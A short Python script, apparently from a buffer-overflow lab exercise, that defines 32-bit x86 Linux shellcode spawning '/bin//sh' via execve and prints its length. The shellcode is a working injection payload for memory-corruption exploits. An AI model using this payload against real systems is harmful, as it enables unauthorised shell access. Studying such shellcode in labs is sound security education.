#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0"            
  "\x50"                 
  "\x68""//sh"           
  "\x68""/bin"           
  "\x89\xe3"             
  "\x50"                 
  "\x53"                 
  "\x89\xe1"             
  "\x99"                 
  "\xb0\x0b"             
  "\xcd\x80"                              
).encode('latin-1')

print(len(shellcode))
